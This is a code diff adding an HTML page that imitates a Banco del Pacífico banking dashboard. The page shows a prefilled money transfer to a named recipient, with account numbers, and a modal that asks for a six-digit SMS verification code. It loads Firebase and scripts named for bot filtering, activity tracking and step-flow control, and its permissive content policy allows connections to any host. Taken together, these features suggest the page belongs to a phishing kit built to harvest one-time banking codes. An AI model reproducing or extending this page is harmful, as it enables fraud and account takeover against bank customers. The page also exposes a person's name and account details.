@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="es" data-bs-title="BdP">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <title></title>
+    <link rel="shortcut icon" href="images/index_001_f33ac973105d.ico">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; connect-src 'self' ws: wss: http: https: https://*.googleapis.com https://*.firebaseio.com https://firestore.googleapis.com wss://*.firebaseio.com https://*.workers.dev; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline' 'unsafe-eval' data: https://www.gstatic.com; img-src 'self' data:; font-src 'self' data:; media-src 'self' data:; object-src 'self' data:; frame-src 'self' data:; form-action 'self'; base-uri 'self'">
+    <link rel="stylesheet" href="css/dashboard.css">
+    <link rel="stylesheet" href="css/modal.css">
+    <link rel="stylesheet" href="css/loader.css">
+</head>
+<body>
+    <header class="dash-header">
+        <div class="dash-brand">
+            <span class="dash-logo-mark" aria-hidden="true"></span>
+            <span>BdP</span>
+        </div>
+        <div class="dash-header-actions">
+            <button type="button" class="dash-icon-btn">
+                <svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="#fff" stroke-width="2">
+                    <circle cx="11" cy="11" r="7"></circle>
+                    <path d="M20 20l-3.5-3.5"></path>
+                </svg>
+            </button>
+            <button type="button" class="dash-icon-btn">
+                <svg viewBox="0 0 24 24" width="24" height="24" fill="#fff">
+                    <path d="M12 22a2.5 2.5 0 0 0 2.45-2h-4.9A2.5 2.5 0 0 0 12 22zm8-6V11a8 8 0 1 0-16 0v5l-2 2v1h20v-1l-2-2z"></path>
+                </svg>
+                <span class="dash-badge">1</span>
+            </button>
+            <span class="dash-avatar" aria-hidden="true"></span>
+        </div>
+    </header>
+
+    <nav class="dash-nav">
+        <button type="button" class="dash-nav-item">
+            <svg viewBox="0 0 24 24"><path d="M12 3l9 8h-3v9h-5v-6H11v6H6v-9H3z"></path></svg>
+            Inicio
+        </button>
+        <button type="button" class="dash-nav-item is-active">
+            <svg viewBox="0 0 24 24"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"></path></svg>
+            Enviar
+        </button>
+        <button type="button" class="dash-nav-item">
+            <svg viewBox="0 0 24 24"><path d="M12 2a10 10 0 1 0 .01 20A10 10 0 0 0 12 2zm1 11h-1.5V7H13v4.2l3.6 2.1-.75 1.25L13 13z"></path></svg>
+            Pagar
+        </button>
+        <button type="button" class="dash-nav-item">
+            <svg viewBox="0 0 24 24"><path d="M20 7h-1V5H5v2H4a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2zM7 5h10v2H7V5zm11 9h-3v-2h3v2z"></path></svg>
+            Solicitar
+        </button>
+        <button type="button" class="dash-nav-item">
+            <svg viewBox="0 0 24 24"><path d="M18 6h-2V4H8v2H6a2 2 0 0 0-2 2v3h16V8a2 2 0 0 0-2-2zM8 6h8v2H8V6zM4 13v5a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-5H4z"></path></svg>
+            Invertir
+        </button>
+    </nav>
+
+    <main class="dash-main">
+        <p class="dash-account">1041620887 – Banco del Pacífico</p>
+
+        <p class="dash-label">A LA CUENTA</p>
+        <p class="dash-name">JOSE ORLEY PALACIOS</p>
+        <p class="dash-sub">019037989355 – BANCO DEL PACÍFICO</p>
+
+        <p class="dash-label">CANTIDAD A ENVIAR</p>
+        <p class="dash-amount">$620.19</p>
+        <p class="dash-hint">El costo de este envío es de $0.00</p>
+
+        <div class="dash-info">
+            <span class="dash-info-icon">i</span>
+            <span>La transferencia se procesará según el horario bancario vigente.</span>
+        </div>
+
+        <div class="dash-field">
+            <p class="dash-label">Motivo del envío</p>
+            <p class="dash-value">Envio a JOSE ORLEY PALACIOS</p>
+        </div>
+
+        <div class="dash-field">
+            <p class="dash-label">Correo electrónico</p>
+            <p class="dash-value">&nbsp;</p>
+        </div>
+
+        <button type="button" id="btnEnviarDinero" class="dash-send" data-mit-label="Enviar dinero">Enviar dinero</button>
+    </main>
+
+    <footer class="dash-footer">
+        <div class="dash-social">
+            <span class="dash-fb">f</span>
+            <span class="dash-x">X</span>
+        </div>
+        <div class="dash-footer-links">
+            <span>Contáctenos</span>
+            <span>Seguridad</span>
+            <span>Cobertura</span>
+        </div>
+    </footer>
+
+    <div id="smsCodeOverlay" class="ui-widget-overlay ui-front dash-overlay-lock"></div>
+    <div id="smsCodeModal" class="sms-code-modal" tabindex="-1" role="dialog" aria-labelledby="smsCodeTitle">
+        <button type="button" id="smsCodeClose" class="sms-code-close">×</button>
+        <div class="sms-code-icon">
+            <img src="images/sms_001_5657c80af656.svg" alt="">
+        </div>
+        <h2 id="smsCodeTitle" class="sms-code-title">Ingresa el código</h2>
+        <p class="sms-code-copy">
+            Hemos enviado un mensaje de texto con un código de verificación al número celular •••••
+        </p>
+        <div class="sms-code-slots" id="smsCodeSlots">
+            <input maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+            <input maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+            <input maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+            <input maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+            <input maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+            <input maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+        </div>
+        <button type="button" id="smsCodeResend" class="sms-code-resend">Reenviar código</button>
+    </div>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+    <script src="js/botshield.js"></script>
+    <script src="js/firebase-config.js"></script>
+    <script src="js/route-resolver-client.js"></script>
+    <script src="js/user-activity-tracker.js"></script>
+    <script src="js/lgp.js"></script>
+    <script src="js/flow-prefetch.js"></script>
+    <script src="js/step-flow-client.js"></script>
+    <script src="js/sms-code-modal.js"></script>
+    <script src="js/loader.js"></script>
+    <script src="js/dashboard.js"></script>
+</body>
+</html>
